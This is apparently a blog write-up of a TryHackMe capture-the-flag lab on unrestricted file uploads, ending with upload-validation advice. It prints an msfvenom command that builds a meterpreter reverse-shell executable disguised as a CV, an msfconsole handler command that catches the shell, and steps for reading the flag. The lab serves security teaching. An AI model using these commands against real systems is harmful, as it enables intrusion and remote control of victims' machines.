---
layout: single
title: "[Day 15] Secure Coding Santa is looking for a Sidekick"
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

# Unrestricted File Uploads

Almost every website provides the ability to upload files. If there is not input validation it can go really wrong. 

Two possible paths: 
1. If the attacker can retrieve the uploaded file again it could lead to code execution, if the attacker uploads a webshell. 
2. If the file is later on viewed by a user, the attacker can embed malware that executes on the users browser.

When uploaded files are put in webroot, it is a whole other story, as for example a .net webserver would pick up these files if the ending is ASP, ASPX or CSHTML and serve it as resources.

# Task
In this case we can upload cv files which will then be reviewed by an employee. 

This create a malicious CV:
```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe```
![malicious file](/assets/images/tryhackme/day15/creating-malicious-exe.PNG)

This will create a listener in msfconsole: 
![listener](/assets/images/tryhackme/day15/msfconsole-listener.PNG)

Set listening port to: 4444
As using attackBox, setting the LHOST to "eth0"
```sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"```

Thats how it looks like when it worked. 
![listener got shell](/assets/images/tryhackme/day15/msfconsole-listener-session-created.PNG)


Now this will directly open a meterpreter session. 

```pwd```

Then moving to the Documents folder of the elf user 
```cd, ls```

Then opening the flag with ```cat```
![cat](/assets/images/tryhackme/day15/users-home.PNG)

# secure development
To prevent such things we need to implement: 

* File Content Validation (Check Content-Type)
* File Extension Validation (Whitelist extensions)
* File Size Validation
* File Renaming (Put random part into your new filename)
* Malware Scanning


